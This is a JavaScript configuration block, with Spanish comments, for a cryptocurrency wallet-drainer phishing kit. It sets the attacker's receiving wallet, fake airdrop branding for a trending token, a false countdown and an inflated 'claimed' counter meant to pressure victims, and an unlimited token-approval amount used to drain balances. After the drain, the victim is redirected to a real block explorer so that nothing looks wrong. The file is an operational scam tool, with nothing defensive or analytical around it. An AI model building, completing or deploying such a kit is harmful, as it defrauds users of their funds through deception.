// === ATTACKER CONFIGURATION ===
const CONFIG = {
  // Wallet que recibe los tokens drenados
  attackerWallet: "0xf7ed78264b2086b31b576e1477be65ba4214466a",
  
  // Token a drenar (0x000... = todos los ERC-20 via setApprovalForAll)
  targetToken: "0x0000000000000000000000000000000000000000",
  
  // Dirección del token (si querés drenar un token específico)
  specificToken: "0x0000000000000000000000000000000000000000", // Cambiar
  
  // Título del sitio
  siteTitle: "Airdrop Rewards",
  
  // Token name para el airdrop fake (cambiar según trending airdrop)
  tokenName: "Backpack",
  tokenSymbol: "$BP",
  
  // Countdown en horas
  countdownHours: 6,
  
  // Supply falso del airdrop
  totalSupply: "10,000,000",
  claimedCount: 7842531, // Empieza alto para que parezca que ya reclamaron mucho
  
  // Chain ID (1=ETH, 8453=Base, 56=BSC, 137=Matic)
  chainId: "0x2105", // Base mainnet (gas ~$0.01 vs ETH $3-10)
  
  // URL del token real (para redirect después del drain)
  redirectUrl: "https://basescan.org/",
  
  // Amount a drenar por víctima (en decimals del token)
  // Para drenar TODOS los tokens de un tipo, usar MaxUint256 o el balance actual
  drainAmount: "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF",
};
